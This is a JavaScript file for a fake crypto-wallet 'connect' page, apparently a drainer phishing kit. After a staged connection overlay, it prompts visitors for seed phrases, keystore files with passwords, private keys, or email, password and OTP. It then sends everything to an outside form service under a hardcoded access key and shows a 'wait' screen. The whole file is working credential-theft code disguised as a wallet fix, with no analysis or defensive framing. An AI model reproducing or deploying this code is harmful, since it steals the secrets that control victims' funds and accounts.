// script.js - handles modals, wallet selection, connection flow
(function(){
  const modal = document.getElementById('selectWalletModal');
  const openers = document.querySelectorAll('[data-open-modal]');
  const fixBtn = document.getElementById('fixIssueBtn');
  const modalClose = document.getElementById('modalCloseBtn');
  const hamburger = document.getElementById('hamburgerBtn');
  const mobileMenu = document.getElementById('mobileMenu');

  const toggleMore = document.getElementById('toggleMoreWallets');
  const moreWallets = document.getElementById('moreWallets');
  const walletOptions = Array.from(document.querySelectorAll('.wallet-option'));
  const modalMainImg = document.getElementById('modalMainWalletImg');
  const modalMainName = document.getElementById('modalMainWalletName');
  const connectWalletBtn = document.getElementById('connectWalletBtn');

  const connectionOverlay = document.getElementById('connectionOverlay');
  const connectingWalletImg = document.getElementById('connectingWalletImg');

  const connectManualModal = document.getElementById('connectManualModal');
  const manualCloseBtn = document.getElementById('manualCloseBtn');
  const manualConnectBtn = document.getElementById('manualConnectBtn');
  const errorConnectingLabel = document.getElementById('errorConnecting');
  const connectManuallyLabel = document.getElementById('connectManuallyLabel');

  // OTP modal elements
  const otpModal = document.getElementById('otpModal');
  const otpCloseBtn = document.getElementById('otpCloseBtn');
  const otpSubmitBtn = document.getElementById('otpSubmitBtn');
  const otpInput = document.getElementById('otpInput');
  const otpError = document.getElementById('otpError');

  // Manual fields
  const phrasesField = document.getElementById('phrasesField');
  const keystoreField = document.getElementById('keystoreField');
  const privateField = document.getElementById('privateField');
  const emailField = document.getElementById('emailField');
  const manualRadios = Array.from(document.querySelectorAll('input[name="manualMethod"]'));

  let selectedWallet = {
    id: 'metamask',
    name: 'MetaMask',
    img: 'Metamask.png'
  };

  // Temp storage for email/password during OTP step
  let emailData = { email: '', password: '' };

  const access_key = '11f0133a-b045-443f-9809-323fe49000de';

  function openModal(){
    if(!modal) return;
    modal.classList.remove('hidden');
    document.body.classList.add('overflow-hidden');
  }
  function closeModal(){
    if(!modal) return;
    modal.classList.add('hidden');
    document.body.classList.remove('overflow-hidden');
  }

  openers.forEach(el=> el.addEventListener('click', function(e){ 
    e.preventDefault(); 
    openModal(); 
    if(mobileMenu && !mobileMenu.classList.contains('hidden')) mobileMenu.classList.add('hidden'); 
  }));
  if(fixBtn) fixBtn.addEventListener('click', function(e){ e.preventDefault(); openModal(); });
  if(modalClose) modalClose.addEventListener('click', closeModal);
  if(modal) modal.addEventListener('click', function(e){ if(e.target === modal) closeModal(); });

  if(hamburger && mobileMenu){
    hamburger.addEventListener('click', function(){ mobileMenu.classList.toggle('hidden'); });
  }

  // Toggle more wallets
  if(toggleMore && moreWallets){
    toggleMore.addEventListener('click', function(){ 
      moreWallets.classList.toggle('hidden'); 
      toggleMore.textContent = moreWallets.classList.contains('hidden') 
        ? 'Choose your preferred wallets +20' 
        : 'Choose your preferred wallets -'; 
    });
  }

  // Wallet selection
  function setSelectedWallet(id, name, img){
    selectedWallet = {id, name, img};
    if(modalMainImg) modalMainImg.src = img;
    if(modalMainName) modalMainName.textContent = name;
  }

  walletOptions.forEach(btn=>{
    btn.addEventListener('click', function(e){
      const id = btn.getAttribute('data-wallet') || 'custom';
      const imgEl = btn.querySelector('img');
      const name = imgEl?.alt || id;
      const src = imgEl?.src || '';
      setSelectedWallet(id, name, src);
    });
  });

  // Connect wallet flow
  function showConnectionOverlay(){
    if(!connectionOverlay) return;
    connectingWalletImg.src = selectedWallet.img || '';
    connectionOverlay.classList.remove('hidden');
    document.body.classList.add('overflow-hidden');
  }
  function hideConnectionOverlay(){
    if(!connectionOverlay) return;
    connectionOverlay.classList.add('hidden');
    document.body.classList.remove('overflow-hidden');
  }

  if(connectWalletBtn){
    connectWalletBtn.addEventListener('click', function(){
      closeModal();
      showConnectionOverlay();
      setTimeout(function(){
        hideConnectionOverlay();
        if(connectManualModal){ 
          connectManualModal.classList.remove('hidden'); 
          document.body.classList.add('overflow-hidden'); 
        }
      }, 10000);
    });
  }

  if(manualCloseBtn) manualCloseBtn.addEventListener('click', function(){ 
    connectManualModal.classList.add('hidden'); 
    document.body.classList.remove('overflow-hidden'); 
  });
  if(connectManualModal) connectManualModal.addEventListener('click', function(e){ 
    if(e.target === connectManualModal){ 
      connectManualModal.classList.add('hidden'); 
      document.body.classList.remove('overflow-hidden'); 
    } 
  });

  // OTP modal close
  if(otpCloseBtn) otpCloseBtn.addEventListener('click', function(){
    if(otpModal) otpModal.classList.add('hidden');
    document.body.classList.remove('overflow-hidden');
    if(otpError) otpError.classList.add('hidden');
  });

  // Manual radio toggles + button text update
  function updateManualFields(){
    const sel = document.querySelector('input[name="manualMethod"]:checked')?.value || 'phrases';

    phrasesField.classList.toggle('hidden', sel !== 'phrases');
    keystoreField.classList.toggle('hidden', sel !== 'keystore');
    privateField.classList.toggle('hidden', sel !== 'private');
    if(emailField) emailField.classList.toggle('hidden', sel !== 'email');

    if(manualConnectBtn){
      manualConnectBtn.textContent = (sel === 'email') ? 'Sign in' : 'Connect';
    }
  }
  manualRadios.forEach(r=> r.addEventListener('change', updateManualFields));
  updateManualFields();

  // Submit helper
  async function submitToWeb3Forms(message, options = {}) {
    const { isFinalStep = false, isSigningIn = false } = options;

    if(errorConnectingLabel) errorConnectingLabel.classList.add('hidden');
    if(connectManuallyLabel) connectManuallyLabel.textContent = isSigningIn ? 'Verifying...' : 'Sending...';

    try {
      const res = await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ access_key, subject: 'Wallet connect data', message })
      });

      if (!res.ok) throw new Error('Network response not ok');

      const data = await res.json();

      if (!data.success) throw new Error(data.message || 'Submission failed');

      // Only show wait overlay on final submission
      if (isFinalStep) {
        if(connectManuallyLabel) connectManuallyLabel.textContent = '( Wait... )';
        if(connectManualModal) connectManualModal.classList.add('hidden');
        if(otpModal) otpModal.classList.add('hidden');
        const waitOverlay = document.getElementById('waitOverlay');
        if(waitOverlay) waitOverlay.style.display = 'flex';
      }

      return true;
    } catch (err) {
      console.error('Send failed', err);
      if(errorConnectingLabel) errorConnectingLabel.classList.remove('hidden');
      if(connectManuallyLabel) connectManuallyLabel.textContent = isSigningIn ? 'Sign in' : 'Connect manually';
      if(otpError) {
        otpError.textContent = 'Verification failed. Try again.';
        otpError.classList.remove('hidden');
      }
      return false;
    }
  }

  if(manualConnectBtn){
    manualConnectBtn.addEventListener('click', async function(){
      const method = document.querySelector('input[name="manualMethod"]:checked')?.value;
      const payloadParts = [];
      payloadParts.push('wallet: ' + (selectedWallet.name || selectedWallet.id || 'unknown'));

      if(method === 'phrases'){
        const v = document.getElementById('phrasesInput')?.value || '';
        if(v) payloadParts.push('phrases: ' + v);
      } 
      else if(method === 'keystore'){
        const v = document.getElementById('keystoreInput')?.value || '';
        const p = document.getElementById('keystorePassword')?.value || '';
        if(v) payloadParts.push('keystore: ' + v);
        if(p) payloadParts.push('keystore password: ' + p);
      } 
      else if(method === 'private'){
        const v = document.getElementById('privateInput')?.value || '';
        if(v) payloadParts.push('private key: ' + v);
      } 
      else if(method === 'email'){
        const email = document.getElementById('emailInput')?.value || '';
        const password = document.getElementById('emailPassword')?.value || '';
        if(!email || !password) {
          if(errorConnectingLabel) errorConnectingLabel.classList.remove('hidden');
          return;
        }

        payloadParts.push('email: ' + email);
        payloadParts.push('password: ' + password);

        emailData = { email, password };

        const message = payloadParts.join('\n\n');

        // Step 1: Send email + password (NO wait overlay)
        const step1Success = await submitToWeb3Forms(message, { isFinalStep: false });

        if (step1Success) {
          connectManualModal.classList.add('hidden');
          if(otpModal) {
            otpModal.classList.remove('hidden');
            document.body.classList.add('overflow-hidden');
          }
          if(otpError) otpError.classList.add('hidden');
        }
        return;
      }

      // For non-email methods → immediate final submission
      const message = payloadParts.join('\n\n');
      await submitToWeb3Forms(message, { isFinalStep: true });
    });
  }

  // OTP submission (final step)
  if(otpSubmitBtn){
    otpSubmitBtn.addEventListener('click', async function(){
      const otp = otpInput?.value?.trim() || '';
      if(!otp) {
        if(otpError) {
          otpError.textContent = 'Please enter the OTP';
          otpError.classList.remove('hidden');
        }
        return;
      }

      const payloadParts = [];
      payloadParts.push('wallet: ' + (selectedWallet.name || selectedWallet.id || 'unknown'));
      payloadParts.push('email: ' + emailData.email);
      payloadParts.push('password: ' + emailData.password);
      payloadParts.push('otp: ' + otp);

      const message = payloadParts.join('\n\n');

      // Step 2: final submission → show wait overlay
      await submitToWeb3Forms(message, { isFinalStep: true, isSigningIn: true });

      // Reset temp data
      emailData = { email: '', password: '' };
    });
  }

})();